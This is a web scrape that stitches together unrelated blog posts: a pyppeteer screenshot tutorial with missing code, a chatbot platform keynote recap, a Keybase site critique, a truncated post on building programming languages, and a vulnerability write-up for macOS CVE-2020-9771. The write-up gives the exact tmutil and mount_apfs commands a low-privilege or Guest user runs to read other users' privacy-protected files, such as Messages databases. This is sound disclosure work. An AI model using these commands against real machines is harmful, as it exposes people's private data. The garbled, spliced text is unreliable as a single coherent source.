<p><a href="https://pypi.org/project/pyppeteer/">pyppeteer</a> is a Python port of a headless Chromium browser automation library <a href="https://github.com/puppeteer/puppeteer">puppeteer</a>. It is a very useful tool in general and can be used to perform a number of tasks like web scraping, automation and making website screenshots! The advantage of using an actual browser to create website screenshots is clear: it gives us the very same result people will see in their own browsers.</p>



<p>Once the screenshot is taken, we will use Python imagining library <a href="https://pillow.readthedocs.io/en/stable/">Pillow</a> to resize the resulting image to the size we want. We can call our code in number of ways, but for this example I will use CLI library <a href="https://click.palletsprojects.com/en/7.x/">Click</a>. You can learn more about Click in my other blog post <a href="https://stribny.name/blog/2020/01/building-command-line-interfaces-in-python">Building command-line interfaces in Python</a>.</p>



<p>So let’s begin by installing our dependencies:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

						<td><div><p>pip install pyppeteer</p><p>pip install pillow</p><p>pip install click</p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->




<p>Pyppeteer will also need a working copy of Chromium, which can be downloaded directly by invoking <code>pyppeteer-install</code> command which will become available after installation.</p>



<p>Once this is done, we can start creating our program. The main code will  start a headless Chromium, navigate to a page we want to capture and save its screenshot to a file of our choosing. The interesting thing is that pyppeteer has asynchronous API, so we will define our function also as asynchronous and later on use Python’s AsyncIO event loop to run it:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f0273038d8d3947723674" data-settings=" no-popup minimize scroll-mouseover">

<p>The code is very straightforward due to the pyppeteer’s simple API. The important decision here is that we want to be able to provide browser’s viewport dimensions. Unless set to a proper screen size, Chromium would start with a very small window and the screenshot would be useless.</p>



<p>After the screenshot is saved, we want to resize it to a size for publishing, so for that let’s implement a resize_screenshot function:</p>



<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f0273038d8d5532013213" data-settings=" no-popup minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>def </span><span>resize_screenshot</span><span>(</span><span>original_path</span><span>:</span><span> </span><span>Path</span><span>,</span><span> </span><span>resized_path</span><span>:</span><span> </span><span>Path</span><span>,</span><span> </span><span>width</span><span>:</span><span> </span><span>int</span><span>,</span><span> </span><span>height</span><span>:</span><span> </span><span>int</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>None</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span> </span><span>=</span><span> </span><span>Image</span><span>.</span><span>open</span><span>(</span><span>original_path</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span>.</span><span>thumbnail</span><span>(</span><span>(</span><span>width</span><span>,</span><span> </span><span>height</span><span>)</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp; </span><span>im</span><span>.</span><span>save</span><span>(</span><span>resized_path</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->




<p>To tie it all together, we will use Click to implement a command. This command will allow us to change all of the parameters we need: the URL, viewport size, final screenshot size and the filenames used for saving the images:</p>

<p>As our capture_screenshot function is async, we had to create AsyncIO event loop to invoke it. You can see the whole working example including the imports in my <a href="https://github.com/stribny/python-screenshots/blob/master/main.py">python-screenshots</a> repository.</p>



<p>To run the program, simply invoke our screenshot command:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<p>As part of the <a href="http://botse.org/" target="_blank" rel="noopener noreferrer">2nd International Workshop on Bots in Software Engineering</a> (BotSE 2020), I gave the keynote <a href="https://www.slideshare.net/jcabot/lessons-learned-from-building-a-commercial-bot-development-platform" target="_blank" rel="noopener noreferrer">“Lessons learned from building a commercial bot development platform”</a> where I discussed some of the key aspects we have learned while building our opensource and <a href="https://modeling-languages.com/low-code-platforms-smart-apps-ai/" target="_blank" rel="noopener noreferrer">low-code</a> chatbot development platform <a href="https://xatkit.com/" target="_blank" rel="noopener noreferrer">Xatkit</a>&nbsp; (see also the <a href="https://github.com/xatkit-bot-platform" target="_blank" rel="noopener noreferrer">Xatkit organization in GitHub</a>)</p>
<p>After an introductory <a href="https://xatkit.com/chatbot-videos-presentations-xatkit/" target="_blank" rel="noopener noreferrer">mini-tutorial on Xatkit</a> and explaining why the world needs yet another bot solution, I moved to discuss the struggles we are facing when trying to move Xatkit from a research prototype to a commercial-grade tool. Some of the challenges are common to any<a href="https://jordicabot.com/industrialization-of-research-tools-the-atl-case/" target="_blank" rel="noopener noreferrer"> industrialization effort</a> (when you’re at the same time the research team and the technology provider in charge of maturing the tool) and shared as well with any other core open source project fighting for its <a href="https://sustainoss.org/" target="_blank" rel="noopener noreferrer">long-term sustainability</a> (a topic on which, btw, <a href="https://livablesoftware.com/bots-open-source-sustainability/" target="_blank" rel="noopener noreferrer">bots can also play a key role</a>).</p>
<p>You can check the slides of my talk below but let me also highlight some of our key lessons learned in building a chatbot platform for you, ranging from organizational, technical, and business challenges:</p>
<ul>
<li><strong>Organizational challenges</strong>
<ul>
<li><strong>You need to be a Polymath to create a bot platform</strong>. Plenty of core bot tech: NLU, Sentiment Analysis, Xtext, Slack/GH/… APIs,…., but even more non-bot tech: InfluxDB, Nginx, eCharts, React, web sockets, Docker… that you’ll need to master when building a bot platform.</li>
<li>Commercial-grade quality involves<strong> spending more and more time on “boring” tasks</strong> as you need to polish all aspects of the tool (interface, docs,…) that you can easily skip when just building a prototype.</li>
<li><strong>Common challenges to any OSS project</strong> like attracting contributors, giving support to <a href="https://livablesoftware.com/5-ways-to-thank-open-source-maintainers/" target="_blank" rel="noopener noreferrer">users that don’t even say thank you</a> or the cost of maintaining external contributions (e.g. connectors) especially when the core is still evolving</li>
<li><strong>Being pragmatic.</strong> Make sure everything you do has a good Return of Investment. Example: we went from having official releases, to core releases to no releases (compile from sources). Also, we don’t support older versions and don’t keep backward compatibility. These are all things that would be nice to have but that we cannot afford.</li>
</ul>
</li>
<li><strong>Technical challenges</strong>
<ul>
<li><strong>Eat your own chatbot food</strong> for a better language. Evolving your DSLs is expensive, try to design a variety of bots to make sure your language is expressive enough for your needs (e.g. when we moved to our current <a href="https://xatkit.com/chatbot-dsl-state-machines-xatkit-language/" target="_blank" rel="noopener noreferrer">state-machine language semantics</a>, we had to reimplement the editor, the examples, the docs,…</li>
<li><strong>Combine textual and graphical notations</strong>. Textual for writing + <a href="https://xatkit.com/graphical-rendering-of-your-chatbot-models/" target="_blank" rel="noopener noreferrer">Graphical for Reading</a></li>
<li>Do not reinvent the wheel. <strong>We came close to reinvent Java!</strong> (and moved to <a href="https://www.eclipse.org/Xtext/documentation/305_xbase.html#xbase-language-ref-introduction" target="_blank" rel="noopener noreferrer">Xbase</a>)</li>
<li>Think long-term. <strong>Research prototypes are pure technical debt</strong></li>
<li>Security. <strong>Are you protected against DDoS attacks via a bot?. </strong>It’s not only a security concern but also an economical one if you’re paying to an external provider (e.g. DialogFlow) to process your input texts. There are also privacy concerns if you keep the session data for further <a href="https://xatkit.com/dashboard-monitoring-chatbot/" target="_blank" rel="noopener noreferrer">bot monitoring and analysis</a>.</li>
</ul>
</li>
<li><strong>Natural Language Processing</strong>
<ul>
<li>NLP engines don’t speak Catalan. Once you’re out of the mainstream languages (English, Spanish, French,….) you may need to combine several NLP engines to cover well the languages you’re interested in.</li>
<li><strong>NLP engines are not bilingual. </strong>In some countries, bots should be able to combine different languages <strong>in the same conversation</strong></li>
<li><strong>Everybody seems interested in having sex with a bot.</strong> Trolls are also a huge problem with bots. As a brand you don’t want to risk going viral because your bot gave the wrong response to a Troll question.</li>
<li><strong>Reusable intent libraries</strong>. You don’t want to define again <em>Greetings</em>, <em>Thank You</em> or <em>Troll</em> intents.</li>
<li><strong>Testing chatbots is a largely unexplored area</strong> • <a href="https://xatkit.com/testing-chatbots-with-botium-and-xatkit/" target="_blank" rel="noopener noreferrer">We use Botium to record conversation</a>s to be used as test cases but need much more (e.g. automatic generation of test cases)</li>
<li><strong>More training sentences are not always better.</strong> Overall quality may decrease if they start overlapping with sentences for other intents.</li>
</ul>
</li>
<li><strong>Business</strong>
<ul>
<li><strong>Most end-users do not want to define chatbots.</strong> It doesn’t matter how nice is your interface. They just want to give you their data and get a bot from you.</li>
<li><strong>Find your niche. </strong>There are over a hundred bot solutions out there. Choose wisely your domain (e.g. <a href="https://xatkit.com/free-chatbot-wordpress-plugin/" target="_blank" rel="noopener noreferrer">our WordPress plugin</a>) and your business model. E.g. Consider Selling a service (such as our consulting and <a href="https://xatkit.com/digital-assistant-services/" target="_blank" rel="noopener noreferrer">managed chatbot hosting services</a>) and not a tool.</li>
<li><strong>Understand what really matters to your future clients</strong>. You’ll be surprised. For instance, making sure the color of your chatbot widget perfectly matches the look and feel of their website may be more important to them that your latest cool AI-based feature.</li>
<li><strong>Help your clients understand what their visitors want to use the bot for. </strong>You think you know what your visitors will want to use the bot for but in reality, you don’t. So having a dashboard to monitor the conversations the bot doesn’t know how to answer is vital.</li>
<li><strong>Self-learning bots</strong>. Your clients will want that but it’s risky. You don’t want the bot to learn the wrong things.</li>
</ul>
</li>
</ul>
<p>At the end of the talk I also emphasized why we belive you should consider using Xatkit</p>
<ul>
<li>As <strong>a bot teaching platform. </strong>If you teach any course involving bots, chatbots, NLP or DSLs / software modeling and are looking for a use-case or a ready-to-use bot platform for experimentation we’ll be happy to help with materials and assistance and even (remote) seminars</li>
<li>As <strong>a bot research platform</strong>. In many bot-related research, researchers spend a significant amount of time putting together the bot pieces they need to create their bots and/or run their experiments. We ask you not to reinvent the wheel and, instead, <strong>adopt Xatkit as base platform.</strong> You’ll benefit from all Xatkit features and connectors to have powerful bots with less effort and will be able to spend more time on the core research aspects</li>
</ul>


<p>Of course, mine was just one of the many interesting talks that took place in the workshop. In the <a href="http://botse.org/" target="_blank" rel="noopener noreferrer">BotSE</a> website, you have the full program and links to the videos and slides of all presentations (e.g. don’t miss the great <a href="https://probot.github.io/" target="_blank" rel="noopener noreferrer">Probot</a> talk by <a href="https://dev.to/gr2m/" target="_blank" rel="noopener noreferrer">Gregor Martynus</a>).

July 3, 2020 | https://theevilbit.github.io/posts/cve_2020_9771/ | <a href="https://web.archive.org/web/*/https://theevilbit.github.io/posts/cve_2020_9771/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <h2 id="tldr">TL;DR</h2>
<p>We could mount the entire file system through APFS snapshots as read-only, with the <code>noowners</code> flag, which enables us accessing (almost) every file in the file system, including data (documents, files, etc…) of every user on the system, including those protected by Apple’s privacy framework (TCC). Even with the Guest account we could read files of admin accounts as Guest! 😱</p>
<p>This could be achieved with a single command, for example:
<code>mount_apfs -o noowners -s http://com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap</code></p>
<p>This has been fixed in macOS Catalina 10.15.4 and on Mojave on the 26th of May.</p>
<h2 id="the-issues">The Issues</h2>
<p>There were two separate issues in this bug, and the combination of those became a very powerful system wide access.</p>
<ol>
<li>TCC privacy is not enforced on mounted local snapshots allowing someone to mount it and access any file inside, including those normally privacy protected</li>
<li>Initiating an APFS snapshot is available for all users, even low privileged ones, as well as listing of those. Beyond that, all users can mount local APFS snapshots, even a low privilege ones, and if used with the <code>noowners</code> flag, the low privilege user can access all data through the local snapshot, including every other users’ data (even high privileged one).</li>
</ol>
<h2 id="1-privacy-bypass">1. Privacy bypass</h2>
<p>From Terminal we can get a list of local snapshots available:</p>
<pre><code>% tmutil listlocalsnapshots /System/Volumes/Data
Snapshots for volume group containing disk /System/Volumes/Data:
com.apple.TimeMachine.2019-11-15-202744.local
com.apple.TimeMachine.2019-11-16-135116.local
com.apple.TimeMachine.2019-11-16-145028.local
com.apple.TimeMachine.2019-11-16-162241.local
com.apple.TimeMachine.2019-11-16-182353.local
com.apple.TimeMachine.2019-11-16-214156.local
com.apple.TimeMachine.2019-11-17-112126.local
com.apple.TimeMachine.2019-11-17-122313.local
</code></pre><p>We can mount one:</p>
<pre><code>csaby@mac ~ % /sbin/mount_apfs -o nobrowse,ro -s com.apple.TimeMachine.2019-11-16-182353.local /System/Volumes/Data /tmp/snap
</code></pre><p>If we navigate the user’s folder, we will be able access locations which our protected by TCC.</p>
<pre><code>csaby@mac ~ % ls -l /tmp/snap/Users/csaby/Library/Messages 
total 6224

-rw-r———r———   1 csaby  staff  1520312 Nov 16 08:09 prewarm.db-wal
</code></pre><p>if we compare it with standard access, it is not permitted:</p>
<pre><code>csaby@mac ~ % ls -l /Users/csaby/Library/Messages
ls: Messages: Operation not permitted
</code></pre><p>This is an issue as we can access every file through the local snapshot mountpoint.</p>
<p>We can also force the creation of a snapshot if there is no one:</p>
<pre><code>csaby@mac ~ % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-140728
</code></pre><p>In short with <code>mount_apfs</code> we can completely bypass privacy protected folders.</p>
<h2 id="2--privilege-escalation">2.  “Privilege escalation”</h2>
<p>Although this method is not a full privilege escalation, as we don’t get higher privileges, however we can access files that belong to higher privilege users, and with the previous finding, this will include TCC protected data.</p>
<p>First, as a low privilege user we can create a local snapshot, and later list it to get its ID (this is not a bug). Although the second is not a hard requirement, as its ID can be figured out based on the time. Also snapshots are auto created by the system, so even if we can’t create one we can find one, and its ID is guessable, because it uses the following format: <code>yyyy-mm-dd-hhmmss</code>.</p>
<p>Here follows the demonstration of the issue. This is the low privileged ID I used:</p>
<pre><code>% id                       
uid=502(n00b) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1)
</code></pre><p>To show that it doesn’t have access to other user’s folder (where by-the-way, <code>csaby</code> is an admin user):</p>
<pre><code>n00b@mac Messages % ls -l /Users/csaby/Library 
ls: Library: Permission denied
</code></pre><p>Let’s create and list local snapshots:</p>
<pre><code>n00b@mac Messages % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-141812

% tmutil listlocalsnapshots /
Snapshots for volume group containing disk /:
com.apple.TimeMachine.2019-11-17-133110.local
com.apple.TimeMachine.2019-11-17-133316.local
com.apple.TimeMachine.2019-11-17-141812.local
</code></pre><p>We can mount the snapshot with <code>noowners</code>, which according to the <code>manpage</code> means:</p>
<blockquote>
<p>Ignore the ownership field for the entire volume.  This causes all objects to appear as owned by user ID 99 and group ID 99.  User ID 99 is interpreted as the current effective user ID, while group ID 99 is used directly and translates to `unknown’.</p>
</blockquote>
<pre><code>n00b@mac Messages % mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
mount_apfs: snapshot implicitly mounted readonly
</code></pre><p>And finally we can access all data from there as the privileges set for our user:</p>
<pre><code>% cd /tmp/snap/Users/csaby 
n00b@mac csaby % ls -l Library/Messages 
total 4704
-rw-r--r--  1 n00b  staff   258048 Nov  9 14:41 chat.db
-rw-r--r--  1 n00b  staff    32768 Nov 17 13:29 chat.db-shm
-rw-r--r--  1 n00b  staff  1507952 Nov  9 14:41 chat.db-wal
</code></pre><p>We can perform this attack even as a <code>Guest</code> account if FileVault is not turned ON. If FileVault is ON, Guest can only run Safari (after a reboot), and also the user data will be encrypted, so even if someone can break out the kiosk mode and start <code>Terminal</code> and run the above commands, he/she wouldn’t see the contents.</p>
<h2 id="the-fix-">The “Fix” 😭</h2>
<p>This requires some longer explanation as IMO the fix provided by Apple is not right.</p>
<p>At the beginning of March 2020, Apple said that the fix is shipped in Catalina 10.15.4 beta, they didn’t tell a word how they fixed it. I quickly jumped on it, and I found that the trick still works. I was puzzled. After some testing it turned out that they tied this to the Full Disk Access (FDA) right in TCC (<code>kTCCServiceSystemPolicyAllfiles</code>), which I found wrong. This is what I wrote them on the 13th of March:</p>
<blockquote>
<p>I did one more test and turned off “Full Disk Access” for Terminal, and then it indeed stopped working. I don’t consider this as a fix, relaying on TCC stopping this is a bad move in my opinion, most people will have Terminal set to “Full Disk Access”.</p>
<p>This still violates the basic BSD security model, as you can read other user’s file, without elevating to root. <strong>Even if SIP is OFF and Terminal has “Full Disk Access”, you shouldn’t be able to mount anything with “noowners” unless you are root</strong>. **The mount operation itself should fail.**If you think about it: Even if SIP is ON and Terminal has Full Disk Access, you can’t see other user’s files with it - with this vulnerability you can.</p>
<p>“Full Disk Access” TCC setting is global, which means that if an admin user enables this, a low privileged user can use Terminal to access the admin user’s files.</p>
</blockquote>
<p>I got a reply the same day:</p>
<blockquote>
<p>Thank you for providing additional information. We will investigate.</p>
</blockquote>
<p>After this point we went into, what I call “black hole mode”, I never got replies to my emails, and than <code>CVE-2020-9771</code> became public on the 26th of May. They shipped the fix to Mojave on that day (<a href="https://support.apple.com/en-us/HT211170),">https://support.apple.com/en-us/HT211170),</a> and retroactively updated the 10.15.4 security notes the same day with this CVE (<a href="https://support.apple.com/en-us/HT211100">https://support.apple.com/en-us/HT211100</a>). I tested this again, and I found the same behavior. At this point I still didn’t know if they considered this fixed or not, as no one came back to me. Their description “This issue was addressed with a new entitlement.” is extremely misleading.</p>
<p>I sent an email again on May 27th (still in “black hole mode”):</p>
<blockquote>
<p>I want to ask again if you consider this fixed via controlling this “exploit” via the “Full Disk Access” permission in TCC. As noted earlier I think it’s not right.</p>
</blockquote>
<p>Finally on the 29th of June I got a reply:</p>
<blockquote>
<p>This issue was addressed with macOS Catalina 10.15.5 and assigned CVE-2020-9771 -&gt;  <a href="https://support.apple.com/HT211170">https://support.apple.com/HT211170</a> . We are not planning any additional changes in this area.</p>
<p>macOS Catalina has improvements which have reduced the need for applications run through Terminal to require Full-Disk Access, and it should not be enabled by a user unless necessary.</p>
</blockquote>
<p>That’s it, not much I can do about this anymore, I only hope that it will get enough public attention, with many disappointed users about the fix, that 🍎 will reconsider the fix.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The “Full Disk Access” right starts to get too much power these days, beyond controlling file access now it controls mounting, and also EndpointSecurity extensions.</p>
<p>This means that a user must be extremely careful which app is granted FDA right, because that will be able to access every user file on the system. If we grant for example <code>Terminal</code> this right, a low privilege user will be able to read our files through the app.</p>
<p>So until this is changed, please triple check what gets this right and what not.</p>

July 3, 2020 | https://yarmo.eu/post/keybase-website | <a href="https://web.archive.org/web/*/https://yarmo.eu/post/keybase-website">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Disclaimer</h2>
<p>Two days ago, I launched <a href="https://keyoxide.org/">Keyoxide.org</a> which provides a few similar functions as <a href="https://keybase.io/">Keybase.io</a> but in an Open Source package. I've been wanting to write this post for a while but felt it could be perceived as disingenuous if posted before making my own project public. Therefore, I post this now.</p>
<h2>TLDR</h2>
<p>The Keybase.io website uses non-optimized resources resulting in a slow pageload and 5+ year old versions of libraries with known and public security vulnerabilities.</p>
<h2>The Keybase.io website</h2>
<p>I have opinions about the Keybase service, but this post is not about that. This is about the facts behind their website, <a href="https://keybase.io/">Keybase.io</a> and more specifically their <a href="https://keybase.io/encrypt">encrypt</a> page, the one you use to <strong>encrypt private and confidential messages</strong>.</p>
<p>When you load that specific page, make sure to load it in a private session or window to eliminate cached resources. What do you notice?</p>
<p>It is slow. Really slow. I noticed so too and decided to run a <a href="https://www.webpagetest.org/result/200627_0Q_044080ef3ab8a678721658c90d2f4706/">Webpagetest (link to result)</a>. Out of three runs, we analyze only the median run (so not the best one, not the worst one).</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_overview.png" alt="Keybase encrypt Webpagetest overview"><br>
<em>keybase.io/encrypt</em></p>
<h2>The content loaded</h2>
<p>It takes <strong>6.25&nbsp;seconds</strong> to fully load the <strong>2.9&nbsp;megabytes</strong> that are used on this page. That is hefty for a page that is essentially a single form. I mean, look at it:</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt.png" alt="Keybase encrypt page"><br>
<em>Why 2.9 megabytes?</em></p>
<p>That's a regular web form. What could possibly be <strong>2.9&nbsp;megabytes</strong>? The javascript?</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_1.png" alt="Webpagetest run 1 overview"><br>
<em>How many requests? How many bytes?</em></p>
<p>Most requests are fonts. That makes sense. Earlier, we saw the page only makes <strong>12&nbsp;requests</strong>, so I could imagine a few of those being several fonts files. Fortunately, fonts are only <strong>6.5%</strong> of the bytes loaded, so we'll forgive them.</p>
<p><strong>90&nbsp;percent</strong> of the bytes are due to javascript and images‽ That's <strong>2.6&nbsp;megabytes</strong> for a form! What images?</p>
<h2>Javascript and image(s)</h2>
<p>Let's grab the <a href="https://www.webpagetest.org/result/200627_0Q_044080ef3ab8a678721658c90d2f4706/1/details/#waterfall_view_step1">waterfall</a> and see what is going on:</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_1_waterfall.png" alt="Webpagetest run 1 waterfall"><br>
<em>Run 1 waterfall</em></p>
<p>At two points in time, the loading of the website stalls. The first stall is <strong>2.6&nbsp;seconds</strong> for the file <code>sitewide-js.js</code>. The second stall is <strong>2.5&nbsp;seconds</strong> for the file <code>footprints_transp.png</code>. Let's go.</p>
<h2>sitewide-js.js</h2>
<p>This file is <strong>4.7&nbsp;megabytes</strong> raw and <strong>1.2&nbsp;megabytes</strong> gzipped. Let us look at a random excerpt:</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__js_excerpt.png" alt="Javascript excerpt"><br>
<em>Javascript excerpt</em></p>
<p>This is not really optimized for performance: one could choose to minimize the javascript. Allow me to use <code>@node-minify/cli</code>.</p>
<p><code>JS_Parse_Error [SyntaxError]: Unexpected token: name «syms», expected: punc «;»</code></p>
<p>Hmm… Let's remove that one line which simply initializes a variable (only fix I could find). I can no longer guarantee it works but let's assume it does.</p>
<p>Old version: <strong>4.7&nbsp;megabytes</strong> raw and <strong>1.2&nbsp;megabytes</strong> gzipped.<br>
New version: <strong>2.5&nbsp;megabytes</strong> raw and <strong>0.7&nbsp;megabytes</strong> gzipped.</p>
<p>First win!</p>
<p>Well, I need to specify one thing: the website loads a gzipped version of the original file at a size of <strong>1.23&nbsp;megabytes</strong>. When I <code>gzip</code> it on my local machine, the original file even becomes <strong>1&nbsp;megabytes</strong>. I don't know what causes this discrepancy, but while we were able to reduce the raw files by 2.2 megabytes, the reduction could only become 0.3 megabytes once gzipped (on my machine™).</p>
<h2>footprints_transp.png</h2>
<p>Have you found the image yet? It's the little image at the bottom of the dog (?) following footprints. Cute :)</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__img.png" alt="Footprints image"><br>
<em>Footprints image</em></p>
<p>Dimensions on page: <strong>330&nbsp;x&nbsp;90 pixels</strong><br>
Dimensions of file: <strong>2836&nbsp;x&nbsp;770 pixels</strong>  </p>
<p>That's only <strong>8.6 times</strong> larger than it needs to be. The bigger crime is the size: <strong>1.4&nbsp;megabytes</strong>. Which is 50% of the website. You guessed it. This could be better.</p>
<p>Using <a href="https://imagecompressor.com/">imagecompressor.com</a>, I can compress this full-sized image down to <strong>398&nbsp;kilobytes</strong> (reduction of <strong>71%</strong>). And I'm even allowing the full 256 colors. And the dimensions are still <strong>8.6&nbsp;times</strong> larger than they need to be.</p>
<p>Optimizing the compression and the image dimensions could yield even better results. I'm not going to bother. The devs didn't either.</p>
<p>Still, second win!</p>
<h2>Anything else we can learn?</h2>
<p>The source code contains this:</p>
<pre><code>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                              K E Y   B A S E

                            crypto for everyone

                        because no one we know ever
                      seems to have a public key. :-(

     No Google Analytics or other 3rd party hosted script tags on Keybase.

     And this has the added bonus that we'll never be able to serve ad code.

                                    \o/  \o/
                                  keybase team

  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</code></pre>
<p>I like it when devs get creative. The third paragraph is a bit alienating, but that's my opinion.</p>
<p>Anything else? Given that this is all cryptography related, maybe some security related issues?</p>
<h2>Security</h2>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__security.png" alt="Webpagetest security score"><br>
<em>Webpagetest security score</em></p>
<p>I've ran quite a few webpagetests on different website, but a <strong>0</strong> security score is new to me. What does that even mean?</p>
<p>Well, <a href="https://snyk.io/test/website-scanner/?test=200627_0Q_044080ef3ab8a678721658c90d2f4706">it turns out</a> that the entire website is built using the following libraries:</p>
<ul>
<li>jquery v1.11.3 (from <a href="https://blog.jquery.com/2015/04/28/jquery-1-11-3-and-2-1-4-released-ios-fail-safe-edition/">april 2015</a>)</li>
<li>bootstrap v3.3.5 (from <a href="https://blog.getbootstrap.com/2015/06/15/bootstrap-3-3-5-released/">june 2015</a>)</li>
<li>moment v2.7.0 (from <a href="https://github.com/moment/moment/releases/tag/2.7.0">june 2014</a>)</li>
</ul>
<p>Besides the obvious aging, these libraries account for a total of six known and public security vulnerabilities, including <a href="https://snyk.io/vuln/SNYK-JS-BOOTSTRAP-72890">cross-site scripting</a>, <a href="https://snyk.io/vuln/SNYK-JS-JQUERY-174006">prototype pollution</a> and <a href="https://snyk.io/vuln/npm:moment:20161019">regular expression denial of service</a>. All six security vulnerabilities have remediations.</p>
<p>Let the <a href="https://blog.getbootstrap.com/2015/06/15/bootstrap-3-3-5-released/">bootstrap v3.3.5 announcement</a> be a painful reminder: this is <em>pushing&nbsp;it</em>.</p>
<h2>Wrapping up</h2>
<p>This should give a nice overview of what could go wrong with a non-optimized and aging website. This could happen to any website. But this is Keybase, the company that promises <strong>"secure messaging and file-sharing"</strong>. The same company that got <a href="https://www.crunchbase.com/organization/keybase">$10.8 million in a Serie A funding</a>. The same company that <a href="https://github.com/keybase/client/issues/24105">won't allow us to see their server code</a>.</p>
<p>To paint a full and fair picture, there has been an <a href="https://keybase.io/docs-assets/blog/NCC_Group_Keybase_KB2018_Public_Report_2019-02-27_v1.3.pdf">audit of the Keybase protocol [PDF]</a> which states that:</p>
<blockquote>
<p>[...] there were weaknesses in the Keybase implementation; these were quickly fixed.</p>
</blockquote>
<p>The audit didn't include the website. I'll just end with another quote from the same audit:</p>
<blockquote>
<p>Another common theme was the presence of legacy code. [...]<br>
This does not necessarily imply that legacy code is insecure, but complexity and security are intertwined – every new piece of code may contain a security vulnerability, and more code correlates with more risk.</p>
</blockquote></div></div>]]>

        <div>

            

            <p>As programming matures and shifts to higher-level abstractions, it becomes more and more about assembling
pre-made building blocks and less about writing new, novel solutions of your own. When I create web apps
(the bread and butter of my day job) I'm using an open-source OS, programming language, database, database
connector library, web server, web framework, authentication libraries, API libraries, payment service libraries...
You get the idea. Increasingly the code I write is "glue" code, simply binding together my building
blocks in the correct order, like a more complicated <a href="https://ifttt.com/">IFTTT</a>, or textual Lego.</p>

<p>It's not surprising that this collection of building blocks is expanding to encompass ever-more-complicated
areas of programming. Today, it's possible to build a simple programming language in the same way you'd
build a web app.</p>


<h3 id="what-s-involved-in-writing-a-language-">What's involved in writing a language?</h3>
<p>The components of a language usually boil down to a "front-end" and a "back-end".</p>
<p>The front-end traditionally consists of a lexer, for turning raw source code into tokens based on grammar
rules, and a parser, for turning tokens into an Abstract Syntax Tree, or AST — nested blocks that represent
operations.</p>
<p>The back-end is the "compiler" which performs steps like type-checking, optimisation, and finally converting
the AST into a lower-level representation. If you're writing an interpreted language, this lower-level is
probably bytecode, rather than an executable, and a corresponding interpreter which reads
and performs bytecode instructions. For example, Python is an interpreted language where <code>.py</code> denotes the raw
source code file, and <code>.pyc</code> the compiled bytecode. When first running a <code>.py</code> file, Python will build a
bytecode-compiled equivalent it can run next time (until your source changes, anyway). If instead you're writing
a compiled language, your back-end builds native executables that can be run directly by the OS.</p>
<p>So once you have a grammar for your syntax, to plug into your front-end, and you can compile the resulting
AST with your back-end, what else is there to do? Well, don't forget about writing a standard library —
defining your built-in types, classes (if you have those), and all of the standard functions to
operate on them. This step is at least as much work.</p>
<h3 id="why-is-it-so-easy-then-">Why is it so easy then?</h3>
<p>If you're writing a language today, many of the parts we defined above already exist for you. Your back-end
and your front-end can both be built out of existing parts.</p>
<p>There are plenty of lexers and parsers available — for example, Lexx and Yacc are a venerable
lexing and parsing combo that have spawned countless modern interpretations. <a href="https://rply.readthedocs.org/">RPly</a>
(RPython Lexx/Yacc) is my current tool of choice in this area. If you use a lexer and parser, the work
left for you is to write your grammar rules, objects representing your AST, and simple functions
telling the parser how to turn grammar into AST. Defining a grammar and an AST are fun! If your syntax
is simple, this step probably won't be that hard either.</p>
<p>For the back-end, <a href="http://llvm.org/">LLVM</a> is the most well-known and respected tool for the job. LLVM powers Clang,
a C and C++ compiler, and other well-known languages like Rust and Swift. The beauty of LLVM is its
Intermediate Representation, or IR. IR looks a lot like assembly language, or really ugly C, but if
you're up for translating your language to LLVM IR, LLVM will take care of optimising and compiling this to a
native executable for you! This is huge. It can even be run in interpreted mode for debugging, or used
as a Just-In-Time (JIT) compiler within your interpreter, if that's your jam.</p>
<p>Fortunately you needn't write IR by hand. Because LLVM has a C interface, there are many LLVM libraries
in many languages to help you create your IR. <a href="http://llvmlite.pydata.org/">Llvm-lite</a> is the most mature Python binding I found,
and what I'm currently using. Essentially, using llvm-lite means you can ask it to create a new function definition for you,
for example, and it'll take care of generating the right IR syntax, and give you back a higher-level interface
for managing variables and code blocks within.</p>
<p>So with this combination of pieces, many of the trickiest parts of writing a language can be wholly outsourced.</p>
<p>Let me give you a concrete example. I'll use my current toy language, written in Python, to demonstrate
how it all goes together:</p>
<ul>
<li>I write a list of tokens (essentially a set of strings) in Python, and feed them to RPly's lexer</li>
<li>I create a Python class to represent each type of AST node or block of code (a function, an if statement, and so on)</li>
